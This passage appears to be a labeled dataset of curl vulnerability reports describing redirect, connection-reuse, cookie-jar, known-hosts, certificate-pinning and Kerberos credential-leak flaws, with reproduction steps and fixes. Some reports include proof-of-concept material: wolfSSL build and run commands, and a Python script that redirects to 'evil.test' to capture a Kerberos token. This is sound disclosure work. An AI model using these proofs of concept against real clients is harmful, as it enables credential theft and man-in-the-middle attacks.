14. Confirm that curl refuses the redirect, demonstrating that exploitation still requires the user to permit the HTTP(S)-to-SFTP transition.
15. Confirm a fix by installing SSH-specific easy-handle options independently of the initial URL protocol rather than returning early for an initial HTTP or HTTPS URL.
16. Repeat the redirect case and verify that the SFTP connection enforces the supplied host-key policy and fails before authentication or file transfer.

### Expected result

SSH host-verification options supplied on the command line must apply whenever the transfer reaches SCP or SFTP, including through an allowed redirect.

### Vulnerable result

Curl configures SSH verification only when the initial URL is SSH-based. An HTTP or HTTPS easy handle redirected to SFTP therefore connects without the requested known-hosts file or host-key pin.


## Suggested fix

Remove the protocol guard in `ssh_setopts()` so that SSH options are always installed on the easy handle. The handle can later transition to SCP/SFTP via redirect, and unused SSH options on a non-SSH transfer are harmless. Add regression tests for an HTTPS-to-SFTP redirect with mismatching `--knownhosts` and `--hostpubsha256`.

## Impact

## Summary:
An attacker able to impersonate an SFTP endpoint referenced by a trusted HTTPS redirect can bypass the user’s requested known-hosts or host-key pin verification. Curl may authenticate to the attacker-controlled SSH server, potentially exposing SFTP credentials and allowing the attacker to substitute downloaded content while curl reports success.
label: real

cve.summary: redirect to SFTP or SCP bypasses host verification

title: CVE-2026-86411: FTP connection reuse inherits client-certificate
body:
## Summary

An `ftp://` transfer configured with `CURLUSESSL_NONE` can reuse a pooled FTP control connection that a previous easy handle upgraded with STARTTLS and authenticated using a client certificate. The second handle performs neither a new TLS handshake nor a new FTP login, so the server continues to authorize it under the first handle's certificate identity.

This is a regression introduced in commit `4ff212f8ed328fb95261e11add8f4d2f0616895a` ("url: connection reuse fixes for starttls"). It is closely related to CVE-2016-5420 (client-certificate identity reuse across connections).

## Root cause

Three things combine to allow this:

1. FTP declares `PROTOPT_SSL_REUSE` (`lib/protocol.c`), so `url_match_ssl_use()` (`lib/url.c:712-730`) accepts an existing TLS-upgraded connection for a later plain `ftp://` transfer.

2. For `CURLUSESSL_NONE`, connection matching sets `may_tls = false` and `require_tls = false` (`lib/url.c:1187-1188`). `url_match_ssl_config()` (`lib/url.c:883-895`) only calls `Curl_ssl_conn_config_match()` when `PROTOPT_SSL` is set or `may_tls` is true. Neither condition holds, so the client-certificate configuration is never compared.

3. Commit `4ff212f8ed` changed `Curl_ftp_conns_match()` (`lib/ftp.c:4472-4492`) from exact `use_ssl` equality (`!=`) to rejecting only when the new value is *greater* than the pooled connection's value (`>`). This permits the `CURLUSESSL_CONTROL` -> `CURLUSESSL_NONE` direction.

## Impact

A handle configured with no client certificate silently inherits the TLS session and certificate identity of a previous handle that used the same connection pool, same FTP destination, and same FTP credentials. The second handle can then perform operations that the server authorizes based on the first handle's certificate.

Prerequisites:

1. Two handles share a connection pool and target the same FTP server with the same `USER`/`PASS`.
2. The first handle uses `CURLUSESSL_CONTROL` with a privileged client certificate.
3. The second handle uses `CURLUSESSL_NONE` with no client certificate.
4. The FTP server derives authorization from the TLS client certificate.

I consider this Low severity given the narrow prerequisites, but the result is a cross-handle authentication bypass, not merely stronger-than-requested encryption.

## Affected versions

curl 8.21.0, plus affected 8.22.0 prerelease/development versions. Introduced by 4ff212f8ed.

## Reproduction

1. Build curl 8.21.0 or another affected revision with FTP, explicit TLS, and client-certificate support.
2. Create a test CA, an FTP server certificate, a privileged client certificate, and a separate unprivileged client certificate.
3. Start an FTP server that supports `AUTH TLS`, requests client certificates, and records a stable identifier and client-certificate identity for each control connection.
4. Configure one FTP resource or command to succeed only when the control connection presents the privileged client certificate.
5. Use the same ordinary FTP username and password for both privileged and unprivileged test transfers so that the authorization difference comes only from the TLS client identity.
6. Create one libcurl multi handle that will provide a shared connection pool.
7. Create a first easy handle for the protected FTP resource, set `CURLOPT_USE_SSL` to `CURLUSESSL_CONTROL`, configure the privileged certificate and key, and add it to the multi handle.
8. Perform the first transfer and confirm that it succeeds, the server records the privileged certificate identity, and curl leaves the FTP control connection available for reuse.
9. Remove the first easy handle while retaining the multi handle and its connection pool.
10. Create a second easy handle for the same FTP destination using the same FTP username and password, but set `CURLOPT_USE_SSL` to `CURLUSESSL_NONE` and configure no client certificate.
11. Perform the second transfer and record `CURLINFO_NUM_CONNECTS`, the FTP response, the underlying server connection identifier, and the certificate identity associated with the request.
12. Observe the vulnerable result: the second transfer reuses the first TLS-upgraded control connection, opens no new control connection, and accesses the protected resource under the privileged certificate identity.
13. Repeat the second transfer with `CURLOPT_FRESH_CONNECT` enabled.
14. Confirm that a new control connection is created without a client certificate and the server denies access.
15. Repeat using explicit TLS and the unprivileged certificate on the second handle.
16. Confirm that curl creates a connection with the unprivileged identity and the server denies access.
17. As a positive control, repeat with the same privileged certificate on both handles and confirm that reuse and authorization are expected.
18. Confirm a fix by requiring client-identity configuration compatibility whenever the pooled connection already uses TLS, even when the new transfer itself specifies `CURLUSESSL_NONE`.
19. Repeat the original privileged-then-no-certificate sequence and verify that the second handle does not inherit the first handle's authenticated FTP control connection.

### Expected result

A transfer without a client certificate must not reuse a control connection authenticated with another handle's client certificate. It must establish its own connection and receive only its own authorization.

### Vulnerable result

Curl permits a weaker FTP configuration to reuse the existing TLS control connection without comparing client-certificate settings. The later handle inherits the earlier handle's privileged certificate identity and authenticated FTP session.

## Suggested fix

When an existing connection has TLS (via STARTTLS), compare client-certificate configuration even when the new handle does not itself request TLS (`may_tls = false`). At minimum, `url_match_ssl_config()` should also gate on whether the pooled connection already has TLS, not only on whether the new handle wants TLS.

## Impact

## Summary:
A lower-privileged transfer sharing curl’s connection pool can operate under a previous handle’s authenticated client-certificate identity. If the FTP server grants additional permissions based on that certificate, the later transfer may read, upload, modify, or delete resources it could not access using its own configuration, creating a cross-handle authorization bypass.
label: real

title: CVE-2026-86412: server-set cookie erases cookie jar
weakness: Improper Check or Handling of Exceptional Conditions
body:
## Summary

A remote HTTP server can set a cookie that curl accepts and writes to a Netscape cookie jar but cannot reload. On the next invocation using the same path for `--cookie` and `--cookie-jar`, curl fails with `CURLE_TOO_LARGE` (100) before connecting, then cleanup replaces the jar with an empty 131-byte header, deleting cookies for unrelated domains.

The root cause is an inconsistency between what `get_netscape_format()` can write and what `cookie_load()` can read, combined with `cookie_load()` unconditionally marking the store as running even after a load failure, which lets cleanup overwrite the jar from an incomplete store.

## Affected versions

curl 8.18.0 through 8.21.0, plus affected 8.22.0 prerelease/development versions.

## Root cause

`parse_cookie_header()` accepts a `Set-Cookie` value up to `MAX_COOKIE_LINE` (5000) bytes. `get_netscape_format()` then adds the domain, path, flags, expiry, and tab delimiters via `curl_maprintf` with no length check on the serialized record.

A cookie with a 4094-byte name, value `v`, and `Path=/` followed by 870 `a` characters, set by a 16-byte host (`attacker.example`), serializes to a 4999-byte jar record.

`cookie_load()` initializes a dynbuf with `MAX_COOKIE_LINE` (5000). The dynbuf limit includes the NUL terminator, and `Curl_get_line()` retains or appends a newline. So the maximum reloadable payload is 4998 bytes before the newline. A 4999-byte record does not fit and `Curl_get_line()` returns `CURLE_TOO_LARGE`.

After the error, `cookie_load()` still sets `ci->running = TRUE` unconditionally (`lib/cookie.c:1211`). `Curl_pretransfer()` propagates the error and never starts a connection, but cleanup sees the cookie store as running and calls `cookie_output()`, which atomically replaces the configured jar with the partially loaded (empty) store. This bypasses the incomplete-store protection added for issue #18621 because the failed loader has already set the running flag.

## Security impact

A remote, unauthenticated HTTP server can:

1. Prevent all later curl transfers that load the poisoned jar (`CURLE_TOO_LARGE` before any connection is made).
2. In the documented same-file `--cookie`/`--cookie-jar` workflow, permanently erase cookies belonging to unrelated domains.

The impact is availability loss and persistent-state integrity corruption across domain boundaries. There is no confidentiality loss or memory corruption. Cookie persistence is opt-in and the boundary condition is narrow (one byte), so I would expect Low severity if considered a security issue.

This is adjacent to issue #18621 and the unreloadable TAB-path case fixed by PR #21185, but the effect is broader: one server-controlled cookie prevents unrelated transfers and can erase cross-domain persistent state.

## Reproduction

1. Build an affected curl release, starting with 8.18.0, with HTTP cookie support enabled.
2. Start two HTTP virtual hosts or test servers representing an attacker-controlled domain and an unrelated victim domain.
3. Have the victim host set a normal persistent cookie and save it to a Netscape-format cookie jar.
4. Contact the attacker-controlled host while using the same file as both cookie input and cookie-jar output.
5. Make the attacker response set a cookie that is accepted by curl's HTTP cookie parser but whose fully serialized Netscape record is one byte larger than the cookie-jar loader can consume.
6. Construct the boundary using a long but accepted cookie name or value plus a long `Path` attribute, accounting for the domain, flags, expiry, separators, newline, and terminating NUL added during serialization and reload.
7. Confirm that curl accepts the attacker cookie, completes the request, and writes a 4999-byte cookie record to the jar alongside the unrelated victim cookie.
8. Preserve a copy of this poisoned jar for a read-only control and record the number of requests received by the victim server.
9. Start a new curl transfer to the victim domain with the poisoned file configured as both cookie input and cookie-jar output.
10. Observe that curl fails with `CURLE_TOO_LARGE` before connecting because the 4999-byte record, newline, and terminating NUL exceed the loader's 5000-byte dynbuf limit.
11. Confirm that the victim server received no new request.
12. Inspect the cookie jar after curl cleanup.
13. Observe the destructive result: curl has replaced the original jar with only its standard header, deleting the attacker record and all unrelated victim cookies.
14. Repeat the reload using the preserved copy only as cookie input, without configuring cookie-jar output.
15. Confirm that loading still fails with `CURLE_TOO_LARGE` but the input file remains unchanged, isolating the deletion to cleanup persistence.
16. Create a boundary control in which the attacker cookie serializes to 4998 bytes instead of 4999 bytes.
17. Repeat the same-file load and save operation and confirm that the shorter record reloads successfully, the victim request occurs, and the cookie jar remains populated.
18. Confirm a fix by ensuring a failed cookie load does not mark the store as safe to persist and by making accepted in-memory cookie limits consistent with serialized reload limits.
19. Repeat the 4999-byte test and verify that curl may reject the transfer but never overwrites the original cookie jar from a partially loaded store.

### Expected result

A server-set cookie written by curl must either be reloadable or be rejected before persistence. A failed cookie-jar load must never cause cleanup to overwrite the original jar with incomplete state.

### Vulnerable result

Curl writes a cookie record that its own loader rejects. The load error occurs before the next connection, but cleanup treats the incomplete store as valid and replaces the shared jar, erasing cookies for every domain in that file.


## Suggested fix

Two changes:

1. Do not set `ci->running = TRUE` when `cookie_load()` fails, so cleanup cannot overwrite a jar from an incomplete load.
2. Make the accepted in-memory cookie limit consistent with the maximum serialized Netscape record that the loader can consume (either check the serialized length in `get_netscape_format()` or increase the dynbuf limit to account for the added fields).

## Impact

## Summary:
A remote, unauthenticated server can poison a shared cookie jar so that later curl operations fail before connecting and then erase cookies belonging to unrelated domains. This can destroy persistent authentication and application state, log users out, disrupt automated workflows, or alter subsequent request behavior; it does not directly disclose cookies or corrupt memory.
label: real

title: CVE-2026-87865: knownhost callback mismatches key as missing
weakness: Improper Validation of Certificate with Host Mismatch
body:
When libcurl uses libssh2 with a hashed OpenSSH known_hosts file, an unrelated first entry can make a hostile key for an already pinned SFTP/SCP host reach CURLOPT_SSH_KEYFUNCTION as CURLKHMATCH_MISSING instead of CURLKHMATCH_MISMATCH.

At https://github.com/curl/curl/blob/68720b4837284335b2d63cb358f8f6ce65f5bc55/lib/vssh/libssh2.c#L653-L687, curl treats the first hashed entry whose public name is NULL as the destination and forces that entry's key algorithm without checking its hostname hash.

With an unrelated hashed RSA entry before the target's hashed Ed25519 entry, a hostile RSA server negotiates successfully; libssh2 then filters out the Ed25519 pin and curl passes NOTFOUND to the callback as MISSING.

To reproduce on curl 8.21.0 commit 68720b4837284335b2d63cb358f8f6ce65f5bc55, build shared libcurl with `cmake -S . -B build -DCURL_USE_LIBSSH2=ON -DBUILD_SHARED_LIBS=ON`, extract the attachment, and run `python3 poc.py --build-dir /absolute/path/to/build --output run.json`.

Both exploit runs exit 0, the callback receives MISSING, the hostile server receives the password canary, and libcurl returns ATTACKER_SFTP_BODY; the target-first and same-type MISMATCH controls send no password.

This is a separate libssh2 root from CVE-2026-9547, whose advisory says libssh2 is unaffected; I used AI to assist the source audit and drafting, then personally reran the exact-release, current-master, control, and fixed-control tests.

## Impact

A network attacker who controls or intercepts the reached SSH endpoint can make an already pinned host appear genuinely new to a trust-on-first-use callback. Libcurl then authenticates to the hostile endpoint; in the proof, the server receives the configured SSH password and libcurl accepts attacker-controlled SFTP data. The default callback and curl command-line tool are not claimed affected.

title: CVE-2026-87866: wolfSSL public-key pinning bypass
body:
## Summary

curl 8.22.0 built with wolfSSL can accept a `CURLOPT_PINNEDPUBLICKEY` hash for a key the TLS peer does not possess.

wolfSSL completes the TLS handshake using public key **A** from a malformed certificate. curl then reparses the same DER using `Curl_parseX509()` and, because of a manipulated `validity` length, selects embedded SPKI **B**.

The server has only private key **A**, but pin **B** is accepted and curl sends the HTTP request.

This is not a CA-validation claim. The PoC uses curl's documented pinning-only mode (`-k` with `--pinnedpubkey`), where the public-key pin must still be verified independently.

## Steps To Reproduce

Prerequisites: `git`, `curl`, `unzip`, `openssl`, `clang`/`clang++`, `make`, Autotools, `pkg-config`, and zlib development headers.

1. Extract the attached bundle and prepare isolated paths:

```sh
unzip SUBMISSION-CURL-WOLFSSL-X509-PIN-BYPASS-20260902-H1-FINAL.zip

POC_DIR="$(pwd)/wolfssl-x509-pin-bypass"
REPRO_ROOT="$(mktemp -d)"
WOLFSSL_PREFIX="$REPRO_ROOT/wolfssl-install"
```

2. Build wolfSSL 5.9.2:

```sh
git clone --depth 1 --branch v5.9.2-stable \
  https://github.com/wolfSSL/wolfssl.git "$REPRO_ROOT/wolfssl"

cd "$REPRO_ROOT/wolfssl"
./autogen.sh

CC=clang \
CFLAGS='-O1 -g -fno-omit-frame-pointer -fsanitize=address,undefined' \
LDFLAGS='-fsanitize=address,undefined' \
./configure --prefix="$WOLFSSL_PREFIX" \
  --enable-tls13 --enable-harden --enable-ed25519 \
  --enable-sessioncerts --enable-opensslextra \
  --disable-benchmark --disable-crypttests

make -j"$(nproc)"
make install
```

3. Download, verify, and build curl 8.22.0:

```sh
cd "$REPRO_ROOT"

curl -LO https://curl.se/download/curl-8.22.0.tar.xz

printf '%s  %s\n' \
  f7ef3ae8a22e521f289803fe93543eb64c329b58aa73a9e224dfd915a2a5f4f7 \
  curl-8.22.0.tar.xz | sha256sum -c -

tar -xf curl-8.22.0.tar.xz
cd curl-8.22.0

CC=clang \
CFLAGS='-O1 -g -fno-omit-frame-pointer -fsanitize=address,undefined' \
CPPFLAGS="-I$WOLFSSL_PREFIX/include" \
LDFLAGS="-L$WOLFSSL_PREFIX/lib -Wl,-rpath,$WOLFSSL_PREFIX/lib -fsanitize=address,undefined" \
./configure --with-wolfssl="$WOLFSSL_PREFIX" \
  --without-libpsl --without-brotli --without-zstd --without-nghttp2 \
  --enable-debug --disable-shared

make -j"$(nproc)"
```

4. Run the end-to-end attack and controls:

```sh
CURL_BIN="$REPRO_ROOT/curl-8.22.0/src/curl" \
WOLFSSL_SRC="$REPRO_ROOT/wolfssl" \
"$POC_DIR/poc/reproduce.sh"
```

Expected:

```text
malformed A + pin B -> exit 0, HTTP 200, canary GET received
malformed A + pin A -> exit 90, HTTP 000, no request
valid A + pin A     -> exit 0, HTTP 200, canary GET received
valid A + pin B     -> exit 90, HTTP 000, no request

PASS: attack case and all three negative controls matched expectations
```

The server uses `poc/key-a.pem` only. No private key corresponding to pin B is provided to the server.

5. Confirm that both parsers select different public keys from the same certificate DER:

```sh
CURL_BUILD="$REPRO_ROOT/curl-8.22.0" \
WOLFSSL_PREFIX="$WOLFSSL_PREFIX" \
"$POC_DIR/poc/run-differential.sh"
```

Expected:

```text
X509_DIFF der=285 curl_off=136 curl_len=44 backend_off=77 backend_len=44 input_equal=1
CURL_SPKI_SHA256=97b8b62490b44349d24429bcf466c2023933c3e3b206465cf7f2a819e53f3a1b
BACKEND_SPKI_SHA256=c5683b7ecce8c958e929f718afa669fedfcaf1013cdea29ab9162327213a2bbe

PASS: the same DER maps to backend SPKI A and curl SPKI B
```

## Attachments

`SUBMISSION-CURL-WOLFSSL-X509-PIN-BYPASS-20260902-H1-FINAL.zip`

## Impact

An attacker controlling a TLS endpoint, but not possessing the pinned private key, can make wolfSSL-backed curl accept the connection as matching that pin and receive the application request sent after the bypass.

This breaks the authentication guarantee of curl's public-key pinning mechanism.

title: CVE-2026-86413: Negotiate credentials sent to redirected origin
body:
Hi all,

I found a way to make libcurl send a live SPNEGO/Kerberos `Authorization: Negotiate` token to a host the client never intended to authenticate to, bypassing the cross-host auth restriction, when following a redirect whose `Location:` header embeds userinfo (`http://user:pass@evil.host/...`).

## The bug

`Curl_http_output_auth()` decides whether to attach auth headers for the current host with:

```c
// lib/http.c:874
if(data->state.creds || Curl_auth_allowed_to_host(data))
    result = output_auth_headers(data, conn, authhost, request,
                                 path_and_query, FALSE);
```

`Curl_auth_allowed_to_host()` is the intended cross-host guard — it's `FALSE` once you've been redirected to a different origin (unless `CURLOPT_UNRESTRICTED_AUTH` is set):

```c
// lib/vauth/vauth.c:140-149
bool Curl_auth_allowed_to_host(struct Curl_easy *data)
{
  return Curl_auth_allowed_to_origin(data, data->state.origin);
}

bool Curl_auth_allowed_to_origin(struct Curl_easy *data,
                                 struct Curl_peer *origin)
{
  return data->set.allow_auth_to_other_hosts ||
         Curl_peer_equal(data->state.initial_origin, origin);
}
```

The problem is the `data->state.creds ||` in front of it. `url_set_data_creds()` runs on every URL (redirects included), and only the CURLOPT_* ("OPTION") credential branch is gated by `Curl_auth_allowed_to_origin()` — the URL-embedded-userinfo branch right below it isn't:

```c
// lib/url.c:1423-1456
static CURLcode url_set_data_creds(struct Curl_easy *data, CURLU *uh)
{
  ...
  if((CURL_EASY_STR(data, STRING_USERNAME) || ... ) &&
     Curl_auth_allowed_to_origin(data, data->state.origin)) {
    result = Curl_creds_create(..., CREDS_OPTION, &newcreds);
    ...
  }

  /* Extract credentials from the URL only if there are none OR
   * if no CURLOPT_USER was set. */
  if(!newcreds || !Curl_creds_has_user(newcreds)) {
    ...
    result = Curl_creds_merge(udecoded, pdecoded, newcreds,
                              CREDS_URL, &newcreds);
    ...
  }
```

So a redirect to `http://user:pass@evil.host/` sets `data->state.creds` non-NULL with **no origin check at all**, which then short-circuits the guard in `Curl_http_output_auth()`. For Negotiate this is worse than it looks: the "credentials" here are never actually used — GSSAPI/SSPI mints the token from the client's ambient Kerberos TGT, not from the URL's user/pass string. So *any* junk userinfo in a redirect Location, even nonsense the attacker doesn't need to know, is enough to unlock sending a real Kerberos service ticket for `HTTP/evil.host` to the attacker.

Sink: [`Curl_output_negotiate()`, `lib/http_negotiate.c:219`](https://github.com/curl/curl/blob/38703fe2610bf6e79390bfc93a8558ffc0e2b02c/lib/http_negotiate.c#L219).

## Where it came from

Introduced by [`8f71d0fde51` — "creds: hold credentials"](https://github.com/curl/curl/commit/8f71d0fde515aa4c68002477356c35bd79927729) (2026-05-11). Before that commit, the guard was:

```c
/* To prevent the user+password to get sent to other than the original host
   due to a location-follow */
if(Curl_auth_allowed_to_host(data) || conn->bits.netrc)
```

That commit dropped this comment along with the strict check, replacing it with the `data->state.creds ||` bypass, while at the same time introducing `url_set_data_creds()`'s asymmetric OPTION-vs-URL gating. Neither half is a problem alone; together they reopen the exact leak the deleted comment was there to prevent. Still present at current `main` ([`38703fe2`](https://github.com/curl/curl/commit/38703fe2610bf6e79390bfc93a8558ffc0e2b02c), 2026-09-02).


## PoC

Two peers: `orig.test` issues the redirect, `evil.test` records whatever it receives. Exploit variant puts userinfo in the redirect; control variant doesn't.

```sh
# Repro: libcurl sends an Authorization: Negotiate (SPNEGO/Kerberos) token to an
# attacker-controlled host after a redirect whose Location carries userinfo.
MODE="$1"   # "exploit" or "control"
...
cat > "$KRBDIR/vf_peers.py" <<'PY'
import socket, sys, threading, os, time
MODE=sys.argv[1]
ORIG=int(os.environ["ORIG_PORT"]); EVIL=int(os.environ["EVIL_PORT"])
OUT=os.environ["EVIL_OUT"]
def serve(port,handler):
    s=socket.socket(); s.setsockopt(socket.SOL_SOCKET,socket.SO_REUSEADDR,1)
    s.bind(("127.0.0.1",port)); s.listen(8)
    while True:
        c,_=s.accept()
        try: handler(c)
        except Exception: pass
        c.close()
def orig(c):
    c.recv(65536)
    if MODE=="exploit":
        loc="http://user:pass@evil.test:%d/secret"%EVIL   # userinfo -> triggers bug
    else:
        loc="http://evil.test:%d/secret"%EVIL             # no userinfo -> control
    b=b"redir"
    c.sendall(("HTTP/1.1 302 Found\r\nLocation: %s\r\nContent-Length: %d\r\nConnection: close\r\n\r\n"%(loc,len(b))).encode()+b)
def evil(c):
    data=c.recv(65536)
    with open(OUT,"ab") as f: f.write(b"EVIL_RECEIVED:\n"+data)
    c.sendall(b"HTTP/1.1 200 OK\r\nContent-Length: 2\r\nConnection: close\r\n\r\nok")
threading.Thread(target=serve,args=(ORIG,orig),daemon=True).start()
threading.Thread(target=serve,args=(EVIL,evil),daemon=True).start()
time.sleep(15)
PY
...
# exercise the shipped libcurl exactly once: follow the redirect with Negotiate on
timeout 60 curl -sS --negotiate -u : -L "http://orig.test:${ORIG_PORT}/start" -o /dev/null || true
...
cat "$EVIL_OUT"   # surface exactly what the attacker host received
```

Run against a `curl/8.21.0-DEV` build with a Kerberos TGT for `tester@EXAMPLE.COM`, `evil.test` received:

```
EVIL_RECEIVED:
GET /secret HTTP/1.1
Host: evil.test:18081
Authorization: Negotiate YIIC9wYGKwYBBQUCoIIC6zCCAuegDTALBgkqhkiG9xIBAgKiggLUBIIC0GCCAswGCSqGSIb3EgECAgEAboICuzCCAregAwIBBaEDAgEOogcDBQAgAAAAo4IBzmGCAcowggHGoAMCAQWhDRsLRVhBTVBMRS5DT02iHDAaoAMCAQOhEzARGwRIVFRQGwlldmlsLnRlc3SjggGQMIIBjKADAgESoQMCAQGiggF+...(truncated)
User-Agent: curl/8.21.0-DEV
Accept: */*
```

A full, valid GSSAPI/Kerberos service ticket for `HTTP/evil.test`, minted from the client's real TGT and handed to a server the client never asked to authenticate to. The control run (no userinfo in the redirect) sends no `Authorization` header at all — same code path, same preconditions, the only variable is the presence of userinfo in the `Location:`.

## Suggested direction

Gate the URL-credential branch in `url_set_data_creds()` (lib/url.c:1454) with the same `Curl_auth_allowed_to_origin()` check the OPTION branch already has, or explicitly strip userinfo from redirect targets before they reach credential extraction unless `CURLOPT_UNRESTRICTED_AUTH` is set.

Cheers,
Josh

## Impact

An attacker who runs any HTTP server a victim is willing to `curl -L` (redirects on) can get the victim's SPNEGO/Kerberos ticket for an arbitrary hostname of the attacker's choosing sent to a server the attacker controls, whenever the victim has `--negotiate`/`CURLAUTH_NEGOTIATE` (or `CURLAUTH_ANY`) on and a live TGT — a very common combination in enterprise SSO setups. That ticket can be captured/relayed to impersonate the victim elsewhere.

Preconditions: `CURLOPT_FOLLOWLOCATION`, `CURLAUTH_NEGOTIATE`/`CURLAUTH_ANY`, SPNEGO support built in, `CURLOPT_DISALLOW_USERNAME_IN_URL` off (default), and an existing Kerberos/SSPI session.
label: real
